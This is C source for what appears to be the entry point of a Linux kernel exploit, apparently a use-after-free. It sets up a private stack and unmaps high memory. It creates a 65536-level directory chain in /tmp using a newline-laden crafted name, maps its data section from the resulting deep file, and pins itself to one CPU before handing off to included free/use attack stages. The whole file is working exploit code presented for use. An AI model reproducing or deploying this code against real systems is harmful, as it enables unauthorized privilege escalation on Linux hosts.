#include "../nolibc/nolibc.h"
#include "../consts/log.h"
#include "../consts/paging.h"
#include "../consts/prog_regions.h"
#include "../consts/stack.h"
#include "../sysutil/pin_cpu.h"
#include "nodes_decl.h"

static char node_master_stack[COMMON_STACK_SIZE] STACK_ALIGNED;

static long __get_stack_ptr(void)
{
	register long rsp asm("rsp");
	return rsp;
}

static int is_stack_switched(void)
{
	long stack_ptr;

	stack_ptr = __get_stack_ptr();
	if (stack_ptr <= (long)(node_master_stack + COMMON_STACK_SIZE) &&
	    stack_ptr > (long)node_master_stack)
		return 1;

	return 0;
}

static void switch_stack(void)
{
	asm volatile("movq %0, %%rsp\n\t"
		     "call main\n\t"
		     "movq %%rax, %%rdi\n\t"
		     "movq $60, %%rax\n\t" /* __NR_exit */
		     "syscall\n\t"
		     "hlt\n\t"
		     :
		     : "r"(node_master_stack + COMMON_STACK_SIZE));
	__builtin_unreachable();
}

static void unmap_garbage(void)
{
	int retval;

	retval = munmap((void *)(TASK_SIZE >> 1), (TASK_SIZE >> 1) - PAGE_SIZE);
	if (retval < 0) {
		perror(L_ERROR "[-] Cannot clean up unnecessary high maps");
		exit(-1);
	}
}

#define LONG_NAME_FILE_DEPTH 65536

static const char *RANDOM_FILE_NAME =
	"\nfawz\n\ny\n\n\ng\n\n\n\n\n\no\n\nj\nt\nsuro\nfk\njp\nq\n\n\n\n\n"
	"lv\n\n\nquhv\nv\nzv\nc\nv\n\n\n\n\n\n\n\nqiq\n\n\nu\nd\n\n\nr\nj\n"
	"\n\n\n\n\nerdb\n\n\n\n\n\n\n\n\ny\nv\n\n\n\n\n\n\nn\n\n\n\nf\nt\ny"
	"\nz\nae\n\n\n\n\n\n\n\nv\n\na\n\nyo\n\n\n\n\nk\n\no\n\n\nh\nj\n\n"
	"\n\nia\n\n\njp\n\n\n\nk\nf\ng\n\n\n\n\n\n\nom\nti\n\n\n\nf\n\nu\n"
	"\ng\n\no\ny\np\n\n\nc\nq\n\n\n\ncf\n\np\nt\n\n\n\n\n\n\ni\ng\n\nrd"
	"u\nscq\n\netbq\n\n\n\n\n";

static int __create_long_name_file(void)
{
	int retval;
	int depth;
	int fd;

	retval = chdir("/tmp");
	if (retval < 0) {
		perror(L_ERROR
		       "[-] Cannot switch the current working directory to /tmp");
		exit(-1);
	}

	for (depth = 0; depth < LONG_NAME_FILE_DEPTH; ++depth) {
		retval = mkdir(RANDOM_FILE_NAME, 0755);
		if (retval < 0) {
			perror(L_ERROR
			       "[-] Cannot create a new directory with the crafted directory name");
			exit(-1);
		}

		retval = chdir(RANDOM_FILE_NAME);
		if (retval < 0) {
			perror(L_ERROR
			       "[-] Cannot swith the current working directory to the new directory");
			exit(-1);
		}

		if (0 == (depth & 4095)) {
			fprintf(stderr,
				L_DOING
				"[ ] Creating a very deep file: %d/%d\n",
				depth, LONG_NAME_FILE_DEPTH);
		}
	}

	fd = open(RANDOM_FILE_NAME, O_RDWR | O_CREAT | O_TRUNC, 0644);
	if (fd < 0) {
		perror(L_ERROR "[-] Cannot create the deep file");
		exit(-1);
	}

	fprintf(stderr, L_DONE "[+] Created the deep file\n");

	return fd;
}

static void __fill_long_name_file(int fd)
{
	char *buf = __data_start;
	long len = __data_end - __data_start;
	long retval;

	while (len > 0) {
		retval = write(fd, buf, len);
		if (retval < 0) {
			perror(L_ERROR
			       "[-] Cannot write the data section to the deep file");
			close(fd);
			exit(-1);
		}

		len -= retval;
	}
}

static void __map_long_name_file(int fd)
{
	void *addr;

	addr = mmap(__data_start, PAGE_ALIGN(__data_end - __data_start),
		    PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED | MAP_FIXED,
		    fd, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       "[-] Cannot remap the data section from the deep file");
		exit(-1);
	}
}

static void map_long_name_file(void)
{
	int fd;

	fd = __create_long_name_file();

	__fill_long_name_file(fd);

	__map_long_name_file(fd);

	close(fd);
}

static void init_cpu_pinning(void)
{
	if (pin_cpu(CPU_0) < 0) {
		perror(L_ERROR "[-] Cannot pin to the first CPU");
		exit(-1);
	}
}

int main(void)
{
	if (!is_stack_switched()) {
		map_long_name_file();
		switch_stack();
	}

	unmap_garbage();

	init_cpu_pinning();
	return run_node_master();
}

#include "node_master.c"
#include "node_free.c"
#include "node_use.c"
